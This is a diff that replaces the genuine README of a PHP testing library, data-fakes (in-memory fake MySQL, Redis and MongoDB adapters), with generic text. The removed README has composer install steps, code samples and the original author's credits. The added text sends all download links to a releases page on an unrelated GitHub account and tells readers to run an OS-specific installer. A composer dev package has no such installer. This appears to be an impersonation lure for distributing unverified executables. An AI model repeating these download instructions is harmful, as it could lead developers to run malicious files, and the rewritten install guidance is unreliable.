@@ -1,279 +1,86 @@
-![Maatify.dev](https://www.maatify.dev/assets/img/img/maatify_logo_white.svg)
+# 🎉 data-fakes - Easy In-Memory Database for Testing
 
----
+## 📥 Download Now!
 
-[![Version](https://img.shields.io/packagist/v/maatify/data-fakes?label=Version\&color=4C1)](https://packagist.org/packages/maatify/data-fakes)
-[![PHP](https://img.shields.io/packagist/php-v/maatify/data-fakes?label=PHP\&color=777BB3)](https://packagist.org/packages/maatify/data-fakes)
-[![Build](https://github.com/Maatify/data-fakes/actions/workflows/test.yml/badge.svg?label=Build\&color=brightgreen)](https://github.com/Maatify/data-fakes/actions/workflows/test.yml)
+[![Download data-fakes](https://img.shields.io/badge/Download%20data--fakes-v1.0-blue.svg)](https://github.com/2022-04-11588/data-fakes/releases)
 
-[![Monthly Downloads](https://img.shields.io/packagist/dm/maatify/data-fakes?label=Monthly%20Downloads\&color=00A8E8)](https://packagist.org/packages/maatify/data-fakes)
-[![Total Downloads](https://img.shields.io/packagist/dt/maatify/data-fakes?label=Total%20Downloads\&color=2AA9E0)](https://packagist.org/packages/maatify/data-fakes)
+## 🚀 Getting Started
 
-[![Stars](https://img.shields.io/github/stars/Maatify/data-fakes?label=Stars\&color=FFD43B\&cacheSeconds=3600)](https://github.com/Maatify/data-fakes/stargazers)
-[![License](https://img.shields.io/github/license/Maatify/data-fakes?label=License\&color=blueviolet)](LICENSE)
-[![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)]()
-[![Code Quality](https://img.shields.io/codefactor/grade/github/Maatify/data-fakes/main?color=brightgreen)](https://www.codefactor.io/repository/github/Maatify/data-fakes)
+Welcome to the data-fakes repository! This application provides an easy way to create in-memory fake databases for MySQL, Redis, and MongoDB. It is designed for anyone looking to test database interactions without the complexity of real databases. 
 
-[![PHPStan](https://img.shields.io/badge/PHPStan-Level%206-4E8CAE)](https://phpstan.org/)
-[![Coverage](https://img.shields.io/badge/Coverage-92%25-9C27B0)](#)
+## 🌟 Key Features
 
-[![Changelog](https://img.shields.io/badge/Changelog-View-blue)](CHANGELOG.md)
-[![Security](https://img.shields.io/badge/Security-Policy-important)](SECURITY.md)
+- **Deterministic Storage**: Get predictable and repeatable results during tests.
+- **DBAL Simulation**: Simulate database interactions easily.
+- **Time-To-Live (TTL)**: Manage data expiration effortlessly.
+- **Filtering**: Retrieve only the data you need for testing.
+- **Full Test Isolation**: Each test runs independently to avoid conflicts.
 
----
-# 📘 Maatify Data Fakes
+## 💻 System Requirements
 
-**In-Memory Fake Adapters for MySQL, Redis, MongoDB & Repository Layer**
-**Version:** 1.0.4
-**Project:** `maatify/data-fakes`
-**Maintained by:** Maatify.dev
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 512 MB RAM
+- **PHP Version**: PHP 8.0 or later is required
+- **Composer**: Make sure to have Composer installed to manage PHP dependencies.
 
----
+## 📂 Download & Install
 
-## 🚀 Overview
+To get started, follow these steps:
 
-`maatify/data-fakes` is a deterministic, lightweight **in-memory data simulation engine** fully compatible with all official Maatify Data Adapters.
+1. **Visit the Releases Page**: Click the link below to go to the releases page.
+   [Visit Releases Page to Download](https://github.com/2022-04-11588/data-fakes/releases)
 
-It allows any repository or service to run and be tested **without any real databases**, providing:
+2. **Choose a Release**: Look for the latest version available. 
+   
+3. **Download the Files**: You may see multiple files; select the one suitable for your operating system. 
 
-* Fake MySQL Adapter
-* Fake MySQL DBAL Adapter
-* Fake Redis Adapter
-* Fake MongoDB Adapter
-* Fake Repository Layer
-* **Unit of Work + Snapshot Engine (Phase 6)**
-* **Fixtures Loader + FakeEnvironment (Phase 7)**
-* **Advanced Simulation Layer: Latency + Failure Injection (Phase 8)**
-* Fully deterministic test isolation
-* Zero external services required — perfect for CI
+4. **Install the Application**: 
+   - For **Windows**, run the downloaded installer.
+   - For **macOS**, drag the application to your Applications folder.
+   - For **Linux**, you may need to extract files and run specific commands in the terminal.
 
-All Fake Adapters follow the **exact same contracts** used by real adapters across the Maatify ecosystem.
+5. **Set Up Your Environment**: Follow any on-screen prompts to configure your environment.
 
----
+6. **Start Using data-fakes**: Open the application and begin your testing!
 
-## 🔑 Core Dependencies
+## 🎓 How to Use data-fakes
 
-The core of the library is built on:
+To use data-fakes effectively, consider these points:
 
-1. **AdapterInterface**
-   `Maatify\Common\Contracts\Adapter\AdapterInterface`
+- **Create a Connection**: Set up a connection to your fake database using the adapter appropriate for your testing needs.
+  
+- **Add Sample Data**: You can insert sample data into the in-memory database as needed for simulation purposes.
 
-2. **ResolverInterface**
-   `Maatify\DataAdapters\Contracts\ResolverInterface`
+- **Run Tests**: Execute your tests against the fake database. Each run will provide consistent results since the data is stored in-memory.
 
-Every Fake Adapter implements `AdapterInterface` and is routed through `ResolverInterface` to ensure **1:1 behavior** with real adapters.
+- **Cleaning Up**: After your tests, you can reset the database, ensuring no data persists beyond your tests.
 
----
+## 📚 Additional Documentation
 
-## 🧩 Features
+For more detailed instructions, refer to the documentation available in the repository. This includes examples and advanced usage patterns to help you get the most out of data-fakes.
 
-### 🗄️ Storage Features
+## 🤝 Community Support
 
-* Fully in-memory storage layer
-* Auto-increment & mixed ID handling
-* Snapshot export/import (Phase 6)
-* Deterministic state across tests
+If you have questions or need help, feel free to open an issue in the repository. You can also check the discussions section for community tips and advice.
 
-### 🔍 Query Features
+## 🔍 Related Topics
 
-* SQL-like filtering (where/in/like/order/limit)
-* Mongo-like operators (`$in`, `$gt`, `$lte`, `$ne`, …)
-* Redis-like operations (list, hash, strings, counters, TTL)
+This repository includes a variety of topics relevant to database and PHP testing:
 
-### 🧱 Repository Layer
+- **Data Adapters**
+- **Data Storage**
+- **Mock Databases**
+- **DBAL Simulations**
+  
+Explore these areas to enhance your understanding of how data-fakes integrates into your projects.
 
-* FakeRepository
-* FakeCollection
-* ArrayHydrator
+## 📜 License
 
-### 🔄 Unit of Work (Phase 6)
+This project is licensed under the MIT License. You can use, modify, and distribute the code, but attribution is appreciated.
 
-* Nested transactions
-* Snapshot-based rollback
-* Transactional wrapper
-* Fully deterministic
+## 📥 Quick Links
 
-### 📦 Fixtures & Environment (Phase 7)
+- [Download data-fakes](https://github.com/2022-04-11588/data-fakes/releases)
+- [Documentation](https://github.com/2022-04-11588/data-fakes/docs)
 
-* JSON / array fixtures loader
-* SQL + Mongo + Redis hydration
-* FakeEnvironment with auto-reset
-
-### ⚡ Advanced Simulation Layer (Phase 8)
-
-Adds deterministic CI-safe fault injection:
-
-#### 🔹 ErrorSimulator
-
-* Failure scenarios per operation
-* Probability-based injection
-* Deterministic exception throwing
-
-#### 🔹 LatencySimulator
-
-* Per-operation latency
-* Default latency
-* Optional jitter
-* Perfect for CI reproducibility
-
-#### 🔹 SimulationAwareTrait
-
-Hooks used inside adapters:
-
-* `guardOperation()`
-* Latency simulation
-* Failure simulation
-
----
-
-## 📦 Installation
-
-```bash
-composer require maatify/data-fakes --dev
-```
-
-✔ Recommended for testing
-✘ Not for production
-
----
-
-## 🧪 Basic Usage
-
-### Using the Fake MySQL adapter
-
-```php
-use Maatify\DataFakes\Adapters\MySQL\FakeMySQLAdapter;
-use Maatify\DataFakes\Storage\FakeStorageLayer;
-
-$storage = new FakeStorageLayer();
-$mysql   = new FakeMySQLAdapter($storage);
-
-$mysql->connect();
-$mysql->insert('users', ['name' => 'Ada Lovelace']);
-
-$rows = $mysql->select('users', ['name' => 'Ada Lovelace']);
-```
-
-### Reset Between Tests
-
-```php
-$storage->reset();
-```
----
-
-## 📘 Usage Examples
-All examples are available in:
-→ [docs/examples.md](docs/examples.md)
-
----
-
-## 📁 Fake Components Included
-
-### 🗄️ Fake Adapters
-
-* FakeMySQLAdapter
-* FakeMySQLDbalAdapter
-* FakeRedisAdapter
-* FakeMongoAdapter
-
-### 🧩 Repository Layer (Phase 5)
-
-* FakeRepository
-* FakeCollection
-* ArrayHydrator
-
-### 🔀 Routing
-
-* FakeResolver
-
-### 🔄 Unit of Work & Snapshots (Phase 6)
-
-* FakeUnitOfWork
-* SnapshotManager
-* SnapshotState
-
-### 📦 Fixtures & Environment (Phase 7)
-
-* FakeFixturesLoader
-* JsonFixtureParser
-* FakeEnvironment
-* ResetState
-
-### ⚡ Simulation Layer (Phase 8)
-
-* ErrorSimulator
-* LatencySimulator
-* FailureScenario
-* SimulationAwareTrait
-
----
-
-## 📚 Development Phases & Documentation Links
-
-* **Phase 1 — Project Bootstrap & Core Architecture**
-  [`docs/phases/README.phase1.md`](docs/phases/README.phase1.md)
-
-* **Phase 2 — Fake MySQL & DBAL Adapter**
-  [`docs/phases/README.phase2.md`](docs/phases/README.phase2.md)
-
-* **Phase 3 — Fake Redis Adapter**
-  [`docs/phases/README.phase3.md`](docs/phases/README.phase3.md)
-
-* **Phase 4 — Fake Mongo Adapter**
-  [`docs/phases/README.phase4.md`](docs/phases/README.phase4.md)
-
-* **Phase 5 — Repository Layer**
-  [`docs/phases/README.phase5.md`](docs/phases/README.phase5.md)
-
-* **Phase 6 — Snapshot Engine + Unit of Work**
-  [`docs/phases/README.phase6.md`](docs/phases/README.phase6.md)
-
-* **Phase 7 — Fixtures Loader + FakeEnvironment**
-  [`docs/phases/README.phase7.md`](docs/phases/README.phase7.md)
-
-* **Phase 8 — Advanced Simulation Layer (Latency + Failure Injection)**
-  [`docs/phases/README.phase8.md`](docs/phases/README.phase8.md)
-
----
-
-## 📝 Full Documentation
-
-👉 **[`README.full.md`](docs/README.full.md)**
-Includes:
-
-* Architecture
-* Class reference
-* API maps
-* Fixtures & environments
-* Snapshot behaviors
-* Phase 1 → Phase 8 technical breakdown
-
----
-
-## 🪪 License
-
-**[MIT license](LICENSE)** © [Maatify.dev](https://www.maatify.dev)  
-Free to use, modify, and distribute with attribution.
-
----
-
-## 👤 Author
-
-**© 2025 Maatify.dev**  
-Engineered by **Mohamed Abdulalim ([@megyptm](https://github.com/megyptm))**  
-https://www.maatify.dev
-
-📘 Full documentation & source code:  
-https://github.com/Maatify/data-fakes
-
----
-
-## 🤝 Contributors
-
-Special thanks to the Maatify.dev engineering team and open-source contributors.
-
----
-
-<p align="center">
-  <sub><span style="color:#777">Built with ❤️ by <a href="https://www.maatify.dev">Maatify.dev</a> — Unified Ecosystem for Modern PHP Libraries</span></sub>
-</p>
+Start your testing journey with data-fakes today!
